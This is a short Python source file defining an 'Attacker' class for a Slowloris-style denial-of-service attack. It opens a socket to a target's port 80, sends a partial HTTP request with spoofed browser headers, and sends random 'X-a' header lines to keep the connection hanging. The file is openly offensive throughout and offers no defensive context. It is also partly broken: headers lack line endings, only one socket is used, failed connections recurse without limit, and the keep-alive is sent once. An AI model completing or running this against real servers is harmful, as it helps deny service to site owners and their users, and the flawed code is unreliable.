import socket
import ssl
import random
import time


class Attacker:
    def __init__(self, target):

        self.target = target

        self.port = 80

        self.loris = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        self.fakeHeaderList = [
            "User-agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, Gecko) Chrome/55.0.2919.83 Safari/537.36",
            "Accept-language: ru,q=0.5"
        ]
    #This method creates the sockets that will be used in the attack
    def createSocket(self):
        try:
            self.loris.connect((self.target, self.port))

        except Exception:

            self.createSocket()

        request = f"GET /?{random.randint(0,2000)} HTTP/1.1\r\n"

        self.loris.send(request.encode("utf-8"))

        for item in self.fakeHeaderList:

            self.loris.send(item.encode("utf-8"))

    #Method that starts the attack on the target
    def attackTarget(self):
        self.stayAlive()

    #Calls on a socket to stay alive
    def stayAlive(self):

        stayAliveMessage = f"X-a:{random.randint(1,2000)}\r\n"

        self.loris.send(stayAliveMessage.encode("utf-8"))
